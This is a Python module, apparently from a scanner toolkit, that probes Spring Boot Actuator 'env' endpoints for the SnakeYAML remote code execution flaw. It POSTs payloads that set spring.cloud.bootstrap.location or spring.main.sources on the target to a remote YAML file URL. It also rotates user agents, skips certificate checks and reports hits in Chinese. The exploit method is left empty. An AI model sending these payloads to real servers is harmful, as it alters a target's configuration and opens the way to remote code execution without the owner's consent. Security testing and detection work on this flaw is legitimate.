# coding:utf-8

import requests
from util import RandomUA

class SnakeYAML_RCE:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.Headers_1 = {
        "User-Agent": self.ua,
        "Content-Type": "application/x-www-form-urlencoded"
        }
        self.Headers_2 = {
        "User-Agent": self.ua,
        "Content-Type": "application/json"
        }
        self.payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
        self.payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
        self.path = 'env'
    def poc(self,url,proxies,ProxyStute):
        if ProxyStute == 1:
            proxies = proxies
        else:
            proxies = None
        try:
            requests.packages.urllib3.disable_warnings()
            urltest = url + self.path

            re1 = requests.post(url=urltest, headers=self.Headers_1, data=self.payload_1, timeout=6, allow_redirects=False,
                            verify=False, proxies=proxies)
            re2 = requests.post(url=urltest, headers=self.Headers_2, data=self.payload_2, timeout=6, allow_redirects=False,
                            verify=False, proxies=proxies)

            if ('example.yml' in str(re1.text)):
                result1 = "[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x\n"
                result2 = f"漏洞存在路径为 {urltest}\n"
                result3 = f"'POST数据包内容为 {self.payload_1}"
                return result1 + result2 + result3
            elif ('example.yml' in str(re2.text)):
                result1 = "[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x\n"
                result2 = f"漏洞存在路径为 {urltest}\n"
                result3 = f"'POST数据包内容为 {self.payload_2}"
                return result1 + result2 + result3
            else:
                result = f"[-] {urltest}未发现SnakeYAML-RCE漏洞"
                return result
        except Exception as e:
            error = f"[error] {url} 未知错误 {e}"
            return error
    def exp(self,url,proxies,ProxyStute,cmd):
        pass